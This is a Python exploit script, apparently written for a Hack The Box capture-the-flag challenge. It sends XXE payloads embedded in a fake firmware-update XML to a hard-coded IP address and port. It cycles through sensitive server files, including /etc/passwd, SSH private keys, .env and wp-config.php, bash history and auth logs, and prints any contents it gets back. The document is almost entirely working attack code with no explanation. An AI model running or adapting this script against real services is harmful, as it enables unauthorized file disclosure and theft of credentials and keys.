import requests
import os,sys,re

###
###

# Define the URL for the POST request
url = 'http://94.237.49.212:57152/api/update'

# Define the headers for the request
headers = {
    'Host': '94.237.49.212:57152',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://94.237.49.212:57152/rom',
    'Content-Type': 'application/xml',
    'Origin': 'http://94.237.49.212:57152',
    'Connection': 'close',
    'Priority': 'u=1'
}

# List of common important files to check, including the flag
files_to_check = [
    '/etc/passwd',
    '/etc/hosts',
    '/etc/apache2/apache2.conf',
    '/etc/httpd/conf/httpd.conf',
    '/var/www/html/config.php',
    '/var/www/html/wp-config.php',
    '/etc/ssh/sshd_config',
    '/root/.bash_history',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/www/html/.env',
    '/home/user/.bashrc',
    '/home/user/.ssh/id_rsa',
    '/home/user/.ssh/authorized_keys',
    '/home/user/.gitconfig',
    '/flag.txt'
]

# Function to create the XXE payload with the specified file path
def create_xxe_payload(file_path):
    return f"""
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]>
    <FirmwareUpdateConfig>
        <Firmware>
            <Version>1.33.7&xxe;</Version>
            <ReleaseDate>2077-10-21</ReleaseDate>
            <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
            <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
        </Firmware>
        <Components>
            <Component name="navigation">
                <Version>3.7.2</Version>
                <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
                <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
            </Component>
            <Component name="communication">
                <Version>4.5.1</Version>
                <Description>Enhanced encryption for secure communication channels.</Description>
                <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
            </Component>
            <Component name="biometric_security">
                <Version>2.0.5</Version>
                <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
                <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
            </Component>
        </Components>
        <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
    </FirmwareUpdateConfig>
    """

# Loop through the list of files and attempt to retrieve their contents
for file_path in files_to_check:
    print(f"Attempting to retrieve: {file_path}")
    
    # Create the XXE payload for the current file
    xxe_payload = create_xxe_payload(file_path)
    
    # Send the POST request with the XXE payload
    response = requests.post(url, headers=headers, data=xxe_payload)
    
    # Print the file contents if the request was successful
    if response.status_code == 200:
        print(f"Contents of {file_path}:\n{response.text}\n")
    else:
        print(f"Failed to retrieve {file_path}. Status code: {response.status_code}\n")

print("Finished checking files.")

###
###
